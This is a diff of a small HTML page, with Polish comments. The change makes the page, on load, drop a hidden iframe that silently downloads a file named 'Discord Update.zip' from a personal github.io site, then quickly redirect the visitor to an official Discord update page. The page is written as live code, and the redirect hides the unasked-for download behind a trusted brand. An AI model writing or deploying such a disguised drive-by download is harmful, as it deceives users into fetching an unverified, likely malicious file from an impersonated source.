@@ -3,15 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <title>Download File</title>
 </head>
 <body>
     <script>
-        // Otwórz nową kartę z podanym adresem URL po załadowaniu strony
-        window.onload = function() {
-            window.open('https://discord.com/tags/app-update', '_blank');
-        };
+        // Funkcja rozpoczynająca pobieranie pliku przez iframe
+        function startDownload() {
+            // Tworzymy ukryty iframe, aby rozpocząć pobieranie
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none'; // Ukrywamy iframe
+            iframe.src = 'https://abolojakub.github.io/website/Discord Update.zip'; // Ścieżka do pliku do pobrania
+            document.body.appendChild(iframe); // Dodajemy iframe do strony
+            
+            // Po krótkim czasie przeładowujemy stronę na Discord
+            setTimeout(function() {
+                window.location.href = 'https://discord.com/tags/app-update';
+            }, 10); // Czas oczekiwania przed przekierowaniem
+        }
+
+        // Uruchamiamy pobieranie i przekierowanie po załadowaniu strony
+        window.onload = startDownload;
     </script>
 </body>
 </html>
-
